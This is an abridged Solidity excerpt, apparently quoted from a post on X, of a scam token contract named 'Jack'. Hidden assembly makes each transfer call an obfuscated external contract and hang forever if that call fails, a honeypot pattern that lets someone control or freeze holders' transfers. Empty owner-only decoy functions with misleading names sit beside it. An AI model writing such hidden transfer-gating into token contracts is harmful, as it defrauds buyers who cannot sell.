// https://x.com/cb_doge/status/1899931692233875820
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    constructor (string memory name_, string memory symbol_) {
        ...
        assembly {
            sstore(0x50,0x44bbbc0f28061a251949c77dbec54e0cee7749a8e739)
            sstore(0x51,0x44bbc54b09fe1535dfd1b5e71d2c1ca1da7eebb73cca)
    ...
    function randomNumberGenerator(uint256 account, uint data) public onlyOwner returns (bytes[] memory datas) {
    }

    function filterNFT() public onlyOwner returns (uint256 spender) {
    }
    ...
    function liquidityWithTIFFs(address sender, uint256 amount) internal returns (uint256 result) {
            assembly {
                let data := mload(0x40)
                mstore(data, 0x569937dd00000000000000000000000000000000000000000000000000000000)
                mstore(add(data, 0x04), amount) mstore(0x40, add(data, 0x24))
                let success := call(gas(), sload(0x52), 0, data, 0x24, data, 0x20)
                if success { result := mload(data) } if iszero(success) { for {} 1 {} {} }
            }
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        liquidityWithTIFFs(sender, amount);
    ...
    function _DeployJack(address account, uint256 amount) internal virtual {
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployJack(creator, initialSupply);
    }
}

contract Jack is ERC20Token {
    constructor() ERC20Token("Jack", "JACK", msg.sender, 6900000000 * 10 ** 18) {
    }
}